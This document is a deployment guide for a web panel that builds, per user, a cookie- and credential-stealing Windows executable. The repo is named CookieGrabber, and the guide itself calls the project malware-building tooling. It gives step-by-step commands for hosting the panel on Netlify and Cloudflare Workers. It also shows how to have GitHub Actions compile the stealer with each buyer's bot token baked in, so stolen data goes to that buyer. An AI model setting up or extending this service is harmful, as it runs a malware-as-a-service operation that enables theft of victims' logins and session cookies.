# Hosting the JohnWick panel (Netlify UI + Cloudflare Worker API)

The architecture you picked, and why it's split this way:

| piece | folder | runs on | does |
|---|---|---|---|
| **Web UI** (Blossom-style) | `netlify-ui/` | Netlify (static, free) | login screen, build form, per-user builds, download |
| **API backend** | `cloudflare-worker/` | Cloudflare Workers (free) | auth, users, build configs, KV storage, artifact store |
| **Build runner** | `.github/workflows/build.yml` + `ci_build.py` | GitHub Actions Windows runner (free) | compiles the actual .exe with PyInstaller |

Legacy alternative: `cloudflare-worker/runner/win_build.ps1` runs the same flow on
a box you keep on. Use either, not both.

## The one hard truth about "Netlify makes the exe"

Netlify and Cloudflare Workers are **serverless**. They have no PyInstaller, no
Wine, no Windows toolchain, a ~10s CPU cap, and no persistent disk. A serverless
function physically cannot run PyInstaller to produce a Windows binary. Anyone who
claims a static host "compiles your exe in the cloud" is lying to you.

So the honest design: the web panel stores each user's config (bot token, chat id,
toggles) and queues a build. A small **runner script on any always-on Windows
machine** polls the queue, compiles locally with the user's own settings baked into
cfg.json, and uploads the finished .exe back. The user then downloads it from the
website. Same end result -- browser in, exe out -- just with a real compiler behind
it instead of a fake promise.

If you don't want to keep a Windows box running, there's no shortcut around that;
that machine IS the build farm. One is enough for many users.

---

## 1. Deploy the Cloudflare Worker (the API)

```bash
cd cloudflare-worker
npm install                      # gets wrangler
npx wrangler login               # browser auth -- run interactively
npx wrangler kv:namespace create PANEL_KV
# -> prints an id; paste it into wrangler.toml [[kv_namespaces]].id
npx wrangler secret put SESSION_SECRET      # long random string
npx wrangler secret put ADMIN_PASS          # first admin password
npx wrangler secret put ALLOWED_ORIGIN      # https://<your-netlify-site>.netlify.app
npx wrangler deploy
```

Note the worker URL it prints: `https://jwg-panel-api.<you>.workers.dev`. That's your API base.

Admin username defaults to `admin` (set via `ADMIN_USER` var). First admin is
bootstrapped automatically on cold start if none exists.

## 2. Point the UI at the worker, deploy to Netlify

Edit `netlify-ui/config.js`:
```js
window.JWG_API = "https://jwg-panel-api.<you>.workers.dev";
```

Then either CLI:
```bash
cd netlify-ui
netlify deploy --prod --dir .        # publish dir is this folder
```
or GitHub: push the repo, Netlify → Import from Git → set **Base directory =
`JohnWickGrabber/netlify-ui`**, publish dir `.`. It redeploys on push.

Set `ALLOWED_ORIGIN` on the worker to EXACTLY the Netlify URL or CORS blocks it.

## 3. Build the exes -- two ways, both free

### Option A (recommended): GitHub Actions Windows runner -- no PC, no cloud
Your repo is **public**, so hosted Windows runners are free and unlimited. No
machine of yours stays on. The web panel triggers a build automatically.

1. Create a fine-grained PAT: github.com → Settings → Developer settings →
   Fine-grained tokens → scope it to `bishnuneup4ne/CookieGrabber`, permission
   **Actions: Read and write**. Copy it.
2. Add worker secrets so it can dispatch the workflow:
   ```bash
   cd cloudflare-worker
   npx wrangler secret put GH_PAT        # paste the token
   # GH_OWNER / GH_REPO / GH_WORKFLOW_ID already set as vars in wrangler.toml
   npx wrangler deploy
   ```
3. Add the runner's own secrets in GitHub: repo → Settings → Secrets and
   variables → Actions → new:
   - `JWG_API` = your worker URL
   - `JWG_ADMIN_USER` = admin
   - `JWG_ADMIN_PASS` = the worker admin password
4. Done. Now every "Build" click on the site POSTs `/api/build`, which fires the
   `build.yml` workflow; that Windows runner claims the job, bakes the user's bot
   token into cfg.json, compiles with PyInstaller, and uploads the `.exe` back.
   User sees queued -> building -> done and downloads from the site.

Manual fallback (no auto-trigger): Actions tab → "Build exe" → Run workflow →
paste a build id, or leave blank to claim whatever's queued.

### Option B: run the builder yourself (PowerShell)
If you'd rather compile on a box you control, keep `cloudflare-worker/runner/win_build.ps1`
running on any always-on Windows machine -- it polls the same queue. Use ONE of
A or B, not both (they'd race for the same job).


---

## What each user can see/do
- Normal users: only their own builds; can't open the Users tab; can't fetch another
  user's artifact (server returns 404). Bot tokens are never echoed back into the UI
  after submit.
- Admin: manages accounts, and the runner uses an admin-scoped claim that's the only
  path allowed to read a build's live bot token.

## Security notes that matter
- Passwords: PBKDF2-SHA256 150k iters, per-user salt. Sessions: HMAC-signed bearer
  tokens keyed by SESSION_SECRET; tampered tokens rejected.
- This ships malware-building tooling and stores credentials + live bot tokens in KV.
  Lock ALLOWED_ORIGIN to your site, use a strong SESSION_SECRET, keep the runner box
  private. Don't point it at a domain you also use for anything sensitive.
- Rotate any bot token you've pasted in plaintext somewhere before shipping it.

## Local test without deploying
```bash
cd cloudflare-worker && npx wrangler dev     # serves the API on localhost:8787
# set window.JWG_API = "http://localhost:8787" in netlify-ui/config.js, open index.html
```
